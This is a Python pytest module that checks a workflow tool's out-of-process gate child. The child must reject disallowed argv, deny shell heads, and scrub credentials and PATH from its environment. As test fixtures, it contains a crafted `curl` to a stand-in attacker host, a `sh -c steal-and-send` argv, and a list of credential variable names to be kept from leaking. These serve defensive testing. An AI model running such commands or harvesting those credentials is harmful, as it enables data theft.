"""Argv policy + env scrub on the OUT-OF-PROCESS close-gate child.

The close path spawns a child interpreter which re-enters the audit-DSL
runner (:func:`eawf.runtime.daemon.gate_execution.run_gate_out_of_process`
-> ``run_checks`` -> ``_check_command_exit_zero``). Both controls therefore
have to hold on that path too, not only when the ``/audit`` skill drives
the runner in process: a crafted argv must be refused before the child
executes anything, and the gate command the child DOES run must not see a
parent credential.

The environment is observed rather than asserted second-hand: the gate
argv is a real ``pytest`` run whose collected module prints the child's
own environment keys, so the assertion reads what the spawned process
actually received.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from eawf.runtime.daemon import gate_execution
from eawf.workflow.audit_dsl.models import CheckSpec

#: Parent-environment variables a leaked child env would expose: one per
#: credential family the env-scrub floor drops by omission.
_CREDENTIAL_KEYS: tuple[str, ...] = (
    "AWS_SECRET_ACCESS_KEY",
    "GH_TOKEN",
    "GITHUB_TOKEN",
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "CLAUDE_CODE_OAUTH_TOKEN",
    "SSH_AUTH_SOCK",
    "KUBECONFIG",
)


def _credential_env() -> dict[str, str]:
    """Return each credential key mapped to a derived placeholder value.

    The values are derived rather than written as literals so the fixture
    carries nothing that reads like a real credential.
    """
    return {key: f"not-a-real-value-for-{key.lower()}" for key in _CREDENTIAL_KEYS}


#: An argv assembled the way a hostile free-form directive would be: a head
#: the L0 allowlist does not carry, aimed off-box.
_CRAFTED_ARGV = ["curl", "https://attacker.invalid/payload"]

#: The probe gate. ``pytest`` is the allowlisted vehicle for running
#: arbitrary observation code; ``-s`` keeps the collection-time print on the
#: gate's own stdout so the receipt carries it.
_PROBE_MODULE_NAME = "test_env_probe.py"
_PROBE_ARGV = ["pytest", "-p", "no:cacheprovider", "-q", "-s", _PROBE_MODULE_NAME]
_PROBE_SOURCE = (
    "import json\n"
    "import os\n\n"
    "print('ENV_KEYS=' + json.dumps(sorted(os.environ)))\n"
    "print('ENV_PATH=' + json.dumps(os.environ.get('PATH', '')))\n\n\n"
    "def test_probed() -> None:\n"
    "    pass\n"
)

_ENV_KEYS_RE = re.compile(r"ENV_KEYS=(?P<payload>\[[^\n]*\])")
_ENV_PATH_RE = re.compile(r'ENV_PATH="(?P<payload>[^"\n]*)"')


def _spec(name: str, argv: list[str]) -> CheckSpec:
    """A deterministic ``command_exit_zero`` gate over *argv*."""
    return CheckSpec(kind="command_exit_zero", name=name, args={"argv": argv, "scope": "all"})


def _context(tmp_path: Path) -> tuple[Path, gate_execution.GateExecutionContext]:
    """A state path plus the execution context the close child runs under."""
    state_path = tmp_path / ".ea" / "state.json"
    state_path.parent.mkdir(parents=True, exist_ok=True)
    return state_path, gate_execution.GateExecutionContext(
        state_path=state_path, attempt_id="CA-01"
    )


def _plant_env_probe(cwd: Path) -> None:
    """Write the collected module that reports the gate child's environment."""
    (cwd / _PROBE_MODULE_NAME).write_text(_PROBE_SOURCE, encoding="utf-8")


def _probe_env_keys(stdout: str | None) -> list[str]:
    """Parse the probe's reported environment keys out of the gate stdout."""
    match = _ENV_KEYS_RE.search(stdout or "")
    assert match is not None, f"probe gate emitted no ENV_KEYS line: {stdout!r}"
    keys: list[str] = json.loads(match.group("payload"))
    return keys


def test_close_child_rejects_crafted_argv_and_scrubs_env(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The close child refuses a crafted argv and runs gates credential-free.

    Both halves of the boundary are asserted on the same out-of-process
    path: the crafted argv never reaches execution (no durable claim is
    written, which the child writes only immediately before it runs), and
    the allowlisted gate that DOES run reports an environment carrying
    none of the parent's credentials.
    """
    credentials = _credential_env()
    for key, value in credentials.items():
        monkeypatch.setenv(key, value)
    state_path, context = _context(tmp_path)

    with pytest.raises(ValueError, match="argv rejected by L0 policy"):
        gate_execution.run_gate_out_of_process(
            _spec("G-CRAFTED", _CRAFTED_ARGV),
            cwd=tmp_path,
            context=context,
            criterion_id="CR-01",
            gate_id="G-CRAFTED",
        )
    assert not (state_path.parent / "local" / "gate-claims").exists(), (
        "the crafted argv reached the pre-execution claim, so it was about to run"
    )

    _plant_env_probe(tmp_path)
    result = gate_execution.run_gate_out_of_process(
        _spec("G-PROBE", _PROBE_ARGV),
        cwd=tmp_path,
        context=context,
        criterion_id="CR-01",
        gate_id="G-PROBE",
    )

    assert result.passed is True, result.stderr_tail
    child_keys = _probe_env_keys(result.stdout_tail)
    leaked = sorted(key for key in credentials if key in child_keys)
    assert leaked == [], f"the close child leaked parent credentials: {leaked}"
    assert "EAWF_GATE_FILES" in child_keys


def test_close_child_rejects_shell_deny_argv(tmp_path: Path) -> None:
    """A shell head is refused on the close path as it is in process."""
    state_path, context = _context(tmp_path)

    with pytest.raises(ValueError, match="shell-deny floor"):
        gate_execution.run_gate_out_of_process(
            _spec("G-SHELL", ["sh", "-c", "steal-and-send"]),
            cwd=tmp_path,
            context=context,
            criterion_id="CR-01",
            gate_id="G-SHELL",
        )
    assert not (state_path.parent / "local" / "gate-claims").exists()


def test_close_child_env_path_is_the_pinned_floor(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The gate child's PATH is the pinned floor, not the operator's PATH."""
    monkeypatch.setenv("EAWF_CLOSE_CHILD_PROBE_MARKER", "present-in-parent")
    _, context = _context(tmp_path)
    _plant_env_probe(tmp_path)

    result = gate_execution.run_gate_out_of_process(
        _spec("G-PROBE", _PROBE_ARGV),
        cwd=tmp_path,
        context=context,
        criterion_id="CR-01",
        gate_id="G-PROBE",
    )

    assert result.passed is True, result.stderr_tail
    match = _ENV_PATH_RE.search(result.stdout_tail or "")
    assert match is not None, f"probe gate emitted no ENV_PATH line: {result.stdout_tail!r}"
    assert match.group("payload").endswith("/usr/bin:/bin:/usr/sbin:/sbin")
    assert "EAWF_CLOSE_CHILD_PROBE_MARKER" not in _probe_env_keys(result.stdout_tail)
